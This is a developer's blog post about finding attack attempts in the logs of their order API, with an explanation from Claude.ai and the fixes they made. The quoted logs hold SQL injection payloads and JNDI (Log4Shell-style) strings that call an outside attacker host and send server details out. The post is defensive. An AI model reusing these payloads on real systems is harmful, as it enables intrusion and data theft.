---
title: "My Server Is Under Attack"
description: "Security is matter: SQL injection, remote code execution, hack .env file..."
date: 2024-03-17T14:29:00+08:00
lastmod: 2024-03-17
tags: [devtools, devops, security, sql]
categories: Blog
featured_image: "/posts/2024/my-server-is-under-attack/web-security-is-matter.png"
images: ["/posts/2024/my-server-is-under-attack/og-server-attack.png"]
---

## How I Found It

I was using the app to check if there are some orders on last Friday. But I felt it was very slow. I was thinking if the [API service](/posts/2023/using-github-action-and-systemd-to-deploy-express-app/) or the database is down.

They were up. 

But when I checked the logs. I found someone was trying to hack the service.

## Attack Methods

They are some very common attack methods. like SQL Injection, remote code execution or listing `env` files.

### SQL Injection

Here is part of the log:

```
Mar 15 16:48:15 lightsh ibkapi[1420640]: GET /products?q=%27%20union%20select%201--%20&count=30&cat=21&p=1 500 2.012 ms - 60
Mar 15 16:48:16 lightsh ibkapi[1420640]: GET /products?q=%25bf%2527%25bf%27%2527%2522%27%22%5C%5C%255C%250d%250a%2523%23&count=30&cat=21&p=1 500 4.498 ms - 60
Mar 15 16:48:16 lightsh ibkapi[1420640]: GET /products?q=&count=30&cat=21&p=1 200 5.655 ms - 75
Mar 15 16:48:16 lightsh ibkapi[1420640]: GET /products?q=%bf%27%bf'%27%22'"\\%5C%0d%0a%23%23&count=30&cat=21&p=1 500 16.973 ms - 60
Mar 15 16:49:07 lightsh ibkapi[1420640]: GET /products?q=&count=30&cat=21&p=%29%29%20OR%20%28SELECT%2AFROM%28SELECT%28SLEEP%283%29%29%29hmmm%29%20limit%201%23 400 0.843 ms - 165
Mar 15 16:49:17 lightsh ibkapi[1420640]: GET /products?q=%bf%27%bf'%27%22'"\\%5C%0d%0a%23%23&count=30&cat=21&p=1 - - ms - -
Mar 15 16:49:27 lightsh ibkapi[1420640]: GET /products?q=&count=30&cat=21&p=%20union%20select%201%2Cmd5%283141592657%29--%20 400 0.787 ms - 149
Mar 15 16:49:27 lightsh ibkapi[1420640]: GET /products?q=&count=30&cat=21&p=%20OR%20%28SELECT%2AFROM%28SELECT%28SLEEP%284%29%29%29iiet%29%20limit%201%23 400 0.847 ms - 163
```

Claude.ai told me this about the log:

> Based on the log file, it appears that the hacker was attempting to perform an SQL injection attack against the `/products` endpoint. SQL injection is a technique where malicious SQL statements are inserted into application entry fields to gain unauthorized access to the database.
>
> The log shows several suspicious requests with SQL injection payloads in the `q` (query), `count`, `cat` (category), and `p` (page) parameters. Some common indicators of SQL injection attempts are:
>
> 1. Single quotes (`'`) surrounding values.
> 2. Use of SQL keywords like `UNION`, `SELECT`, `SLEEP`, etc.
> 3. Comments denoted by `--` or `#`.
> 4. Encoded payloads with characters like `%bf`, `%5C`, etc.
>
> The hacker seems to be trying various SQL injection techniques, such as:
>
> - Union-based SQL injection to retrieve data from the database.
> - Boolean-based blind SQL injection using the `SLEEP()` function to cause time delays.
> - Attempting to bypass input validation and filters.
>

The good thing is the service didn't accept most of the hacking requests. It returned `500` or `400` status after checking users' input. Thanks to the well developed web framework.

But due to the quick development requirement. Some of the code didn't follow some security practices.

### Remote Code Execution

Here is more from the log:

```
Mar 15 17:31:35 lightsh ibkapi[1457656]: GET /orders/?status=-1&count=10&p=${jndi:rmi://183.47.120.213:1099/bypass4ab2c832c1448624ddd652713f2b4b1b-/-${hostName}} 400 1.655 ms - 201
Mar 15 17:31:35 lightsh ibkapi[1457656]: GET /orders/?status=-1&count=10&p=${jndi:rmi://hostname-${hostName}.username-${sys:user.name}.javapath-${sys:java.class.path}.f4a52b7ecb98e763293fb54f33f9bec8.4j2.mauu.mauu.me/} 400 1.722 ms - 258
Mar 15 17:31:35 lightsh ibkapi[1457656]: GET /orders/?status=-1&count=${jndi:rmi://183.47.120.213:1099/bypassac9360b825294b91b646092c425c6bbc-/-${hostName}}&p=1 400 1.673 ms - 204
Mar 15 17:31:36 lightsh ibkapi[1457656]: GET /orders/?status=-1&count=${jndi:rmi://hostname-${hostName}.username-${sys:user.name}.javapath-${sys:java.class.path}.d601c9c9ea5954abc0cb6524f1ef38b1.4j2.mauu.mauu.me/}&p=1 400 1.714 ms - 261
Mar 15 17:31:36 lightsh ibkapi[1457656]: GET /orders/?status=-1&count=${jndi:ldap://hostname-${hostName}.username-${sys:user.name}.javapath-${sys:java.class.path}.28a0de6ce19ccf80f25549df1f122931.4j2.mauu.mauu.me/}&p=1 400 1.781 ms - 262
Mar 15 17:31:36 lightsh ibkapi[1457656]: GET /orders/?status=-1&count=10&p=${jndi:ldap://183.47.120.213:1389/jdk185bf1616da873b6fb2299bbc60897c1c1-/-${hostName}} 400 1.749 ms - 201
Mar 15 17:31:36 lightsh ibkapi[1457656]: GET /orders/?status=${jndi:ldap://hostname-${hostName}.username-${sys:user.name}.javapath-${sys:java.class.path}.05d82899be802b7b14abf20f5a33c934.4j2.mauu.mauu.me/}&count=10&p=1 400 2.063 ms - 257
Mar 15 17:31:36 lightsh ibkapi[1457656]: GET /orders/?status=${jndi:rmi://hostname-${hostName}.username-${sys:user.name}.javapath-${sys:java.class.path}.4a8e6c20ca6a4eca49521e213836ea1f.4j2.mauu.mauu.me/}&count=10&p=1 400 1.689 ms - 256
Mar 15 17:31:37 lightsh ibkapi[1457656]: GET /orders/?status=-1&count=10&p=${jndi:ldap://hostname-${hostName}.username-${sys:user.name}.javapath-${sys:java.class.path}.d9d20bac90980d15fa1378aa79ecf5b6.4j2.mauu.mauu.me/} 400 1.779 ms - 259
Mar 15 17:31:37 lightsh ibkapi[1457656]: GET /orders/?status=${jndi:ldap://183.47.120.213:1389/jdk182e89f41a6b436965af1a90ca38171439-/-${hostName}}&count=10&p=1 400 3.987 ms - 199
Mar 15 17:31:37 lightsh ibkapi[1457656]: GET /orders/?status=-1&count=${jndi:ldap://183.47.120.213:1389/jdk18d153c35bfaed3f0f17ee6fa0f8d0c558-/-${hostName}}&p=1 400 1.681 ms - 204
Mar 15 17:31:37 lightsh ibkapi[1457656]: GET /orders/?status=${jndi:rmi://183.47.120.213:1099/bypasseb349f918c3fe86e4b5676793614e952-/-${hostName}}&count=10&p=1 400 1.755 ms - 199
```

> Based on the additional log entries, it appears the hacker was attempting a remote code execution attack against the application using Java deserialization vulnerabilities and the Java Naming and Directory Interface (JNDI) protocol.
>
> The log shows requests with URLs containing suspicious parameter values starting with `${jndi:rmi://` and `${jndi:ldap://`. These are JNDI injection payloads that attempt to make the application deserialize untrusted data from a remote server controlled by the attacker.
>
> Here's a breakdown of what the hacker was trying to achieve:
>
> 1. The attacker is using JNDI injection payloads that reference a remote server at the IP address `183.47.120.213` on ports `1099` (RMI) and `1389` (LDAP).
> 2. The payloads include obfuscated strings like `bypass4ab2c832c1448624ddd652713f2b4b1b`, `f4a52b7ecb98e763293fb54f33f9bec8`, etc. These could be encoded remote class names or serialized objects that the attacker wants the application to deserialize.
> 3. The payloads also include system properties like `${hostName}`, `${sys:user.name}`, and `${sys:java.class.path}`, which attempt to retrieve sensitive information about the server environment.
> 4. The attacker is targeting different endpoints like `/orders/` and using different parameters (`status`, `count`, `p`) to bypass input validation and find an entry point for the JNDI injection attack.
>
> If successful, this attack could allow the attacker to execute arbitrary code on the server, leading to complete system compromise.

## Fixing It?

I've made these updates of the service:

### Using Prepared Statements

I'm using `mysql2` lib for the data access. But some sql statements were using string concatenation which wolud be a risk for SQL injection.

As the docs described I switched to [Prepared Statements](https://sidorares.github.io/node-mysql2/docs/examples/queries/prepared-statements/select) like this:

```js
try {
  const sql = 'SELECT * FROM `users` WHERE `name` = ? AND `age` > ?';
  const values = ['Page', 45];

  const [rows, fields] = await connection.execute(sql, values);

  console.log(rows);
  console.log(fields);
} catch (err) {
  console.log(err);
}
```

### Limiting The User Inputs

There is a search feature but it didn't have a limitation (e.g. length, special characters).

### Logging

As you can see in the previous log. I didn't log some important client info e.g. IP. So I added them.

## Enough?

I don't think there is a final solution for security. You'd keep eyes on your system.

Questions here:

1. Have you ever suffered from the security issues?
2. Do you have any interesting stories about fighting hackers?



